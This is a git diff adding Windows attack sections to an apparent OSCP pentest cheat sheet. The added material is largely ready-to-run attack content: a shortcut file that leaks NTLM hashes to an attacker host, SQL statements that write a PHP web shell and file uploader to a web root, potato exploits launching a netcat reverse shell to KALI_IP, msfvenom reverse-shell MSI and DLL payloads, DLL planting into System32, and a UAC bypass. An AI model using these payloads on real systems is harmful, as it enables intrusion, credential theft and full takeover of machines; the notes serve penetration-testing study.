@@ -273,6 +273,34 @@ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
+### SMB to NTLM Theft
+
+Create a offsec.url as below
+
+```bash
+[InternetShortcut]
+URL=anything
+WordkingDirectory=anything
+IconFile=\\KALI-IP\%USERNAME%.icon
+IconIndex=1
+```
+Just Upload via SMB CLIENT and listen via Responder you will get the NTLM Hash !!
+
+
+
+### LAPS:
+
+![image](https://github.com/kullaisec/OSCP/assets/99985908/db596238-7457-4ce9-a9aa-34c49057aa47)
+
+![image](https://github.com/kullaisec/OSCP/assets/99985908/81dec7e5-1334-4009-8ae6-412b2943ec6a)
+
+```
+# netexec ldap 192.168.225.122 -u username -p password --kdcHost HUTCHDC[see image] -M laps
+```
+
+
+
+
 #### Search anywhere file in windows:
 ```
 > dir /s/b \local.txt
@@ -427,6 +455,27 @@ Path:
 ```
 https://github.com/antonioCoco/ConPtyShell
 
+## Windows Phpmyadmin Reverse shell:
+
+Github Link: https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
+
+```sql
+SELECT 
+"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+```
+## Windows php Reverse shell:
+
+Github Link : https://github.com/Dhayalanb/windows-php-reverse-shell
+
+or 
+
+```sql
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
+```
+
+
+
 ## Windows PrivEsc:
 
 Automation:
@@ -445,7 +494,7 @@ PS> .\Seatbelt.exe all
 ```
 **WinPeas:**
 
-https://github.com/peass-ng/PEASS-ng/ >> Download only latest to egt more accurate results!
+https://github.com/peass-ng/PEASS-ng/ >> Download only latest to get more accurate results!
 
 Run a registry command to enable the colors if you are using GUI windows!
 ```
@@ -476,7 +525,40 @@ Start/Stop a service:
 > net start/stop <name>
 ```
 
-### 1. Insecure Service Permissions
+### SeImpersonate:
+
+```powershell
+PS> .\PrintSpoofer64.exe -i -c powershell.exe
+```
+```powershell
+C:\> .\GodPotato.exe -cmd "C:\Users\Public\nc.exe KALI_IP PORT -e cmd"
+```
+```powershell
+PS> .\SweetPotato.exe -a whoami
+```
+```powershell
+PS> .\SweetPotato.exe -p shell.exe
+```
+
+## Windows Path Setting
+
+Sometims when you enter `whoami` command then it is not recognized by the Windows!!
+
+```
+C:\Users\Public> whoami
+
+Error: 'whoami' is not recognized as an internal or external command operable program or batch file.
+
+```
+
+#### Solution:
+
+```
+C:\Users\Public> set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\
+```
+
+
+### Insecure Service Permissions
 ```
 > .\winPEASany.exe quiet servicesinfo
 ```
@@ -571,6 +653,129 @@ try {
     Write-Output "Failed to add user 'andrea' to the Administrators group."
 }
 ```
+
+### Unquoted Service Path
+
+**Powershell**
+
+```powershell
+PS C:> Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+```
+
+**Command Prompt:**
+
+```
+C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+### DLL Hijacking
+
+Read OSCP Notes !!
+
+### Powershell History
+
+```powershell
+PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
+```
+
+Displayes the Powershell History files of `Dave` User
+
+### Shedule Tasks
+
+**Command Prompt:**
+
+```
+C:\> schtasks /query /fo LIST /v
+```
+
+**Powershell**
+
+```powershell
+PS > Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+If you see any binary you have full access or Modify permissions then replace it and wait for some time to get the elevated shell !!
+
+### AlwaysInstallElevated
+
+Upload any malicious .msi file and run that and get the system level access !!
+
+```
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o reverse.msi
+```
+
+**Target system: **
+```
+PS C:\Users\Public\temp> msiexec /quiet /qn /i C:\Users\Public\temp\reverse.msi
+```
+Listen on 443 and get the Elevated Shell
+
+### Windows PrivEsc Write Access
+
+Suppose we are have read and write access to the Adminsitrator and we can alos read the Proof.txt flag but we are unable to get the shell This method will works there !!
+
+Take an example we are `apache` [Low Priv] user and we have `SQL server` on it and that sql server have `Admistrative permissions` and we can Write the Files as `Admins` so Using the diaghub dll method we can get the Shell !!
+
+First Create a Malicious `test.dll` file
+```
+# msfvenom --platform windows --arch x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 EXICFUNC=THREAD LPORT=443 -f dll -o test.dll
+```
+Now upload the [diaghub.exe] (https://github.com/xct/diaghub/releases/download/0.1/diaghub.exe) binary to the same location where the test.dll is there !!
+looks like :
+
+![image](https://github.com/kullaisec/OSCP/assets/99985908/5c642bf3-4de1-4eb6-83df-6b66c4889dcd)
+
+Now go to the mysql service and try to place the `test.dll` on the `Windows\system32\` path ...
+
+example
+```sql
+MariaDB [(none)]> select load_file('C:\\\\test\\temp\\test.dll') into dumpfile 'C:\\\\Windows\\System32\\test.dll';
+```
+you can see we are able to do this now `test.dll` file is in the `System32\` path !!
+
+```
+PS C:\test\temp> .\diaghub.exe C:\test\temp test.dll
+```
+
+And listen on 443 we will get elevated shell !!
+
+More methods reference : https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#diaghub
+
+### UAC Bypass
+
+Suppose you are part of Administrator Group But you are unable to perform commands as a High Level User then there may be chances of UAC interruption we can bypass that !!
+
+PS> whoami /all   --> Mandatory Label\Medium Mandatory Level
+
+
+![image](https://github.com/kullaisec/OSCP/assets/99985908/87c89a83-8d16-4a31-98bd-6be51924ce51)
+
+**Exploitation:**
+
+Tool Github Link:  https://github.com/CsEnox/EventViewer-UACBypass
+
+On target System: 
+
+```powershell
+PS > Import-Module .\Invoke-EventViewer.ps1
+PS > Invoke-EventViewer 
+[-] Usage: Invoke-EventViewer commandhere
+Example: Invoke-EventViewer cmd.exe
+```
+replace the malicious Bianry and get the Elavted Access by bypassing the UAC !!
+
+```powershell
+PS > Invoke-EventViewer C:\Users\Public\temp\reverse.exe
+[+] Running
+[1] Crafting Payload                                                                         
+[2] Writing Payload                                                                          
+[+] EventViewer Folder exists                                                                
+[3] Finally, invoking eventvwr 
+```
+After Exploitation:
+
+![image](https://github.com/kullaisec/OSCP/assets/99985908/536fc075-092c-44d8-b8f9-70217e1db1bd)
+
+
 
 ## Linux PrivEsc:
 
